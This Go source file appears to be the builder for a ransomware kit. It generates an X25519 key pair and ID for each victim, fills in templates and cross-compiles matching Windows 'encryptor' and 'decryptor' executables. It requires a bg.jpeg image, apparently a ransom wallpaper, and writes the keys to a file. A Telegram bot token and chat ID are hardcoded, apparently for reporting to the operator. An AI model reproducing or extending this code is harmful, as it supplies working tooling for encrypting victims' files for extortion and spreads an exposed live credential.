package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"text/template"
)

type KeyData struct {
	ID              string
	PublicKeyBytes  string
	PrivateKeyBytes string
	EncryptedToken  string
	EncryptedChatID string
}

func main() {
	if _, err := os.Stat("bg.jpeg"); os.IsNotExist(err) {
		fmt.Println("ERROR: bg.jpeg tidak ditemukan")
		os.Exit(1)
	}

	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		panic(err)
	}
	pub := priv.PublicKey()
	privBytes := priv.Bytes()
	pubBytes := pub.Bytes()

	id := generateID()

	originalToken := "8377619914:AAGDSBXt-DtgqJRMFdxIxEo2NvxI9EuS5S8"
	originalChatID := "5640449716"

	encToken, err := encryptString(originalToken, id)
	if err != nil {
		panic(err)
	}
	encChatID, err := encryptString(originalChatID, id)
	if err != nil {
		panic(err)
	}

	data := KeyData{
		ID:              id,
		PublicKeyBytes:  formatByteSlice(pubBytes),
		PrivateKeyBytes: formatByteSlice(privBytes),
		EncryptedToken:  encToken,
		EncryptedChatID: encChatID,
	}

	if err := processTemplate("encryptor_template.go", "encryptor_gen.go", data); err != nil {
		panic(err)
	}
	defer os.Remove("encryptor_gen.go")

	if err := processTemplate("decryptor_template.go", "decryptor_gen.go", data); err != nil {
		panic(err)
	}
	defer os.Remove("decryptor_gen.go")

	outEnc := fmt.Sprintf("e_%s.exe", id)
	if err := buildBinary(outEnc, "encryptor_gen.go"); err != nil {
		panic(err)
	}
	fmt.Printf("Encryptor built: %s\n", outEnc)

	outDec := fmt.Sprintf("d_%s.exe", id)
	if err := buildBinary(outDec, "decryptor_gen.go"); err != nil {
		panic(err)
	}
	fmt.Printf("Decryptor built: %s\n", outDec)

	keyFile := fmt.Sprintf("%s.txt", id)
	content := fmt.Sprintf(
		"ID: %s\nPublic Key (bytes): %s\nPrivate Key (bytes): %s\n\nPublic Key (hex): %x\nPrivate Key (hex): %x\n",
		id, data.PublicKeyBytes, data.PrivateKeyBytes, pubBytes, privBytes,
	)
	if err := os.WriteFile(keyFile, []byte(content), 0644); err != nil {
		fmt.Printf("Warning: failed to save key file: %v\n", err)
	}
	fmt.Printf("Keys saved to: %s\n", keyFile)
}

func generateID() string {
	idBytes := make([]byte, 4)
	if _, err := rand.Read(idBytes); err != nil {
		panic(err)
	}
	raw := (int(idBytes[0])<<24 | int(idBytes[1])<<16 | int(idBytes[2])<<8 | int(idBytes[3])) % 100000000
	id := fmt.Sprintf("%08d", raw)
	if len(id) > 8 {
		id = id[:8]
	}
	return id
}

func buildBinary(output, source string) error {
	cmd := exec.Command("go", "build", "-o", output, source)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func encryptString(plain, id string) (string, error) {
	key := sha256.Sum256([]byte(id))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(plain), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func formatByteSlice(b []byte) string {
	var sb strings.Builder
	sb.WriteString("{")
	for i, v := range b {
		if i > 0 {
			sb.WriteString(", ")
		}
		fmt.Fprintf(&sb, "%d", v)
	}
	sb.WriteString("}")
	return sb.String()
}

func processTemplate(tmplFile, outFile string, data KeyData) error {
	tmpl, err := template.ParseFiles(tmplFile)
	if err != nil {
		return err
	}
	f, err := os.Create(outFile)
	if err != nil {
		return err
	}
	defer f.Close()
	return tmpl.Execute(f, data)
}
